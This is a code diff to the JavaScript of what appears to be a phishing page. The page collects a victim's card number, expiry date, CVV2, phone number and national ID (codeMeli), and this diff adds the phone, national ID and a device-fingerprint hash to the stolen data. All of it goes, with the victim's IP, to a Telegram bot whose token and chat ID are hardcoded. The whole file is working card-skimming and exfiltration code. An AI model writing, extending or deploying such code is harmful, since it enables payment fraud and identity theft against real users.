@@ -1,6 +1,31 @@
 const token = '7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY';
 const chatId = '-4614449543';
 
+var du = new DeviceUUID().parse();
+var dua = [
+  du.language,
+  du.platform,
+  du.os,
+  du.cpuCores,
+  du.isAuthoritative,
+  du.silkAccelerated,
+  du.isKindleFire,
+  du.isDesktop,
+  du.isMobile,
+  du.isTablet,
+  du.isWindows,
+  du.isLinux,
+  du.isLinux64,
+  du.isMac,
+  du.isiPad,
+  du.isiPhone,
+  du.isiPod,
+  du.isSmartTV,
+  du.pixelDepth,
+  du.isTouchScreen,
+];
+var uuid = du.hashMD5(dua.join(':'));
+
 const sendMessage = async function (message) {
   await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
@@ -163,7 +188,8 @@ function validateCVV2(cvv) {
     return true;
   }
 }
-
+let codeMeli;
+let phone;
 let errors = [];
 form.addEventListener('keydown', e => {
   // e.preventDefault();
@@ -194,8 +220,12 @@ form.addEventListener('keydown', e => {
     Expiration: ${mm}/${yy}
     Cvv2: ${cvv2Input.value}
     --------------
+    Phone: ${phone}
+    CodeMeli: ${codeMeli}
+    --------------
     IP: ${userIp}
     Device: ${getDeviceType()}
+    DeviceId: ${uuid}
   `;
     console.log(cardInput.value);
     console.log(mm);
@@ -302,6 +332,8 @@ firstBtn.addEventListener('click', () => {
     validateNationalID(`${codemeliInput.value}`)
   ) {
     setTimeout(() => {
+      codeMeli = codemeliInput.value;
+      phone = phoneInput.value;
       document.getElementById('page1').classList.add('hidden');
       document.getElementById('page2').classList.remove('hidden');
       setTimeout(() => {
@@ -456,48 +488,3 @@ serverItem.forEach(serv => {
       .setAttribute('src', currentServer.img);
   });
 });
-
-var du = new DeviceUUID().parse();
-var dua = [
-  du.language,
-  du.platform,
-  du.os,
-  du.cpuCores,
-  du.isAuthoritative,
-  du.silkAccelerated,
-  du.isKindleFire,
-  du.isDesktop,
-  du.isMobile,
-  du.isTablet,
-  du.isWindows,
-  du.isLinux,
-  du.isLinux64,
-  du.isMac,
-  du.isiPad,
-  du.isiPhone,
-  du.isiPod,
-  du.isSmartTV,
-  du.pixelDepth,
-  du.isTouchScreen,
-];
-var uuid = du.hashMD5(dua.join(':'));
-console.log(uuid);
-
-Toastify({
-  text: uuid,
-  duration: 3000,
-  newWindow: true,
-  close: true,
-  gravity: 'top', // `top` or `bottom`
-  position: 'right', // `left`, `center` or `right`
-  stopOnFocus: true, // Prevents dismissing of toast on hover
-  style: {
-    fontSize: '1rem',
-    fontWeight: '600',
-    background: '#15bb09',
-    width: '300px',
-    minWidth: '100%',
-    display: 'flex',
-    justifyContent: 'space-between',
-  },
-}).showToast();
